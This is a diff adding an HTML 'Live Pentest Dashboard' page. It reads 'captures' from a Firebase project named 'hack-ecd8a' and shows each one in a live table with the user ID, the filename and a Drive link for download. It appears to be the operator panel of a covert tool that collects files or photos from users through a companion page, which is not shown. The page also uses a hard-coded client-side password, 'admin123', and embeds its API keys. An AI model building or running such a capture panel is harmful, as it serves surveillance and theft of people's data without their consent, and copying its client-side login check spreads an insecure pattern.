@@ -1,0 +1,140 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Admin Dashboard</title>
+    <script src="https://www.gstatic.com/firebasejs/10.13.1/firebase-app-compat.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/10.13.1/firebase-database-compat.js"></script>
+    <style>
+        body { font-family: Arial; margin: 0; background: #1a1a1a; color: white; }
+        .container { max-width: 1200px; margin: auto; padding: 20px; }
+        #login { text-align: center; padding: 50px; }
+        #dashboard { display: none; }
+        input { padding: 12px; font-size: 16px; border: none; border-radius: 5px; width: 200px; }
+        button { padding: 12px 24px; background: #ff4444; color: white; border: none; border-radius: 5px; cursor: pointer; }
+        .upload { background: #4CAF50; margin-left: 10px; }
+        table { width: 100%; border-collapse: collapse; margin-top: 20px; }
+        th, td { padding: 12px; text-align: left; border-bottom: 1px solid #333; }
+        th { background: #333; }
+        .photo { width: 80px; height: 60px; object-fit: cover; border-radius: 5px; }
+        .drive-link { color: #4CAF50; text-decoration: none; }
+        .drive-link:hover { text-decoration: underline; }
+        .live { animation: pulse 2s infinite; }
+        @keyframes pulse { 0% { opacity: 1; } 50% { opacity: 0.5; } 100% { opacity: 1; } }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div id="login">
+            <h1>🔐 Admin Login</h1>
+            <input type="password" id="passInput" placeholder="Password">
+            <button onclick="login()">Login</button>
+        </div>
+        
+        <div id="dashboard">
+            <h1>📊 Live Pentest Dashboard</h1>
+            <p>Total Captures: <span id="total">0</span> | Live: <span id="live" class="live">Scanning...</span></p>
+            <table id="uploadsTable">
+                <thead>
+                    <tr>
+                        <th>Time</th>
+                        <th>Type</th>
+                        <th>User</th>
+                        <th>File</th>
+                        <th>Size</th>
+                        <th>Drive Link</th>
+                        <th>Action</th>
+                    </tr>
+                </thead>
+                <tbody></tbody>
+            </table>
+        </div>
+    </div>
+
+    <script>
+        // 🔥 SAME CONFIGS AS index.html
+        const firebaseConfig = {
+  apiKey: "AIzaSyB2VzKQeFdMoAC5Y90O4ii4BZVkP3oBr4g",
+  authDomain: "hack-ecd8a.firebaseapp.com",
+  databaseURL: "https://hack-ecd8a-default-rtdb.firebaseio.com",
+  projectId: "hack-ecd8a",
+  storageBucket: "hack-ecd8a.firebasestorage.app",
+  messagingSenderId: "736008641484",
+  appId: "1:736008641484:web:c5f07d36bd14bfce7ddb69",
+  measurementId: "G-GPK3FDGSTQ"
+};
+        const ADMIN_PASS = "admin123";  // Change this
+
+        firebase.initializeApp(firebaseConfig);
+        const db = firebase.database();
+
+        const loginDiv = document.getElementById('login');
+        const dashboard = document.getElementById('dashboard');
+        const passInput = document.getElementById('passInput');
+        const totalSpan = document.getElementById('total');
+        const liveSpan = document.getElementById('live');
+        const tbody = document.querySelector('#uploadsTable tbody');
+
+        function login() {
+            if (passInput.value === ADMIN_PASS) {
+                loginDiv.style.display = 'none';
+                dashboard.style.display = 'block';
+                loadData();
+                addLog('✅ Admin access granted');
+            } else {
+                alert('❌ Wrong password');
+            }
+        }
+
+        function addLog(msg) {
+            console.log(`[${new Date().toLocaleTimeString()}] ${msg}`);
+        }
+
+        function loadData() {
+            db.ref('uploads').on('value', (snapshot) => {
+                tbody.innerHTML = '';
+                let total = 0;
+                
+                snapshot.forEach((child) => {
+                    const data = child.val();
+                    total++;
+                    const row = tbody.insertRow();
+                    row.innerHTML = `
+                        <td>${new Date(data.timestamp).toLocaleString()}</td>
+                        <td>${data.type.toUpperCase()}</td>
+                        <td>${data.userId}</td>
+                        <td>${data.filename}</td>
+                        <td>${formatBytes(data.size || 0)}</td>
+                        <td><a href="${data.driveUrl}" target="_blank" class="drive-link">📎 View</a></td>
+                        <td><button class="upload" onclick="downloadFile('${data.driveUrl}')">💾 Download</button></td>
+                    `;
+                });
+                
+                totalSpan.textContent = total;
+                liveSpan.textContent = total > 0 ? `${total} captures` : 'No activity';
+            });
+        }
+
+        function formatBytes(bytes) {
+            if (bytes === 0) return '0 Bytes';
+            const k = 1024;
+            const sizes = ['Bytes', 'KB', 'MB', 'GB'];
+            const i = Math.floor(Math.log(bytes) / Math.log(k));
+            return parseFloat((bytes / Math.pow(k, i)).toFixed(2)) + ' ' + sizes[i];
+        }
+
+        function downloadFile(url) {
+            const a = document.createElement('a');
+            a.href = url;
+            a.download = '';
+            a.click();
+        }
+
+        // Enter key login
+        passInput.addEventListener('keypress', (e) => {
+            if (e.key === 'Enter') login();
+        });
+    </script>
+</body>
+</html>
